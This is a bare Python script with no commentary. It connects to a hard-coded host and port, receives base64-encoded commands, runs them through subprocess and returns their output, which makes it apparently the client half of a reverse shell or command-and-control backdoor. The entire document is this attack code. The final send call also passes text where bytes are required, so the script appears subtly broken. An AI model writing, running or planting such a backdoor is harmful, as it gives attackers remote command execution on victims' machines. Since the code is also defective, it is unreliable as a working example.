import socket, subprocess, os, base64

HOST = '127.0.0.1'
PORT = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    c = s.recv(1024).decode()
    if c.strip() == "exit": break
    
    c = base64.b64decode(c.encode()).decode()
    
    o = subprocess.getoutput(c)

    s.send(base64.b64encode(o.encode()).decode())

s.close()
